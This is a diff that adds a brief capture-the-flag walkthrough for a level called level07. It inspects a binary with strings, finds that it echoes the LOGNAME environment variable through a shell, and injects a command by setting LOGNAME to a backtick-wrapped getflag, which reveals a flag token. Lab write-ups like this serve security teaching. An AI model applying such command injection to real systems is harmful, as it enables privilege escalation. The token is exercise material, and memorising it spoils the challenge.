@@ -1,0 +1,16 @@
+$> ls -la
+there is an executable level07, we get a level07 when we execute it.
+
+$> strings level07
+we can see this: 
+"LOGNAME"
+"/bin/echo %s"
+
+so it is echo-ing an env variable called LOGNAME.
+
+we can try to put a `getflag` as the LOGNAME value
+$> export LOGNAME=\`getflag\`
+$> ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+su level08
